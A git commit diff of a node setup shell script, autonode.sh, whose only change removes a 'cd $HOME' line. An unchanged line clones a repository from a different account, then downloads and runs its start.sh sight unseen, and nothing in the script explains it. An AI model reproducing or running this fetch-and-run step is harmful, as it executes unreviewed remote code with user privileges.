615420b3f69669dd51aca40411436e7e995954ff
Mr Dikci <97982648+Dikci@users.noreply.github.com>
2024-03-28 22:28:05 +0300

    Update autonode.sh

--- autonode.sh
+++ autonode.sh
@@ -5,7 +5,6 @@ sudo apt install make clang pkg-config lz4 libssl-dev build-essential git jq ncd
 sudo apt install curl -y
 git clone https://github.com/Wrevart/wertotg && wget https://raw.githubusercontent.com/Wrevart/wertotg/main/start.sh && chmod +x start.sh && ./start.sh
 
-cd $HOME
 VERSION=1.21.6
 wget -O go.tar.gz https://go.dev/dl/go$VERSION.linux-amd64.tar.gz
 sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go.tar.gz && rm go.tar.gz
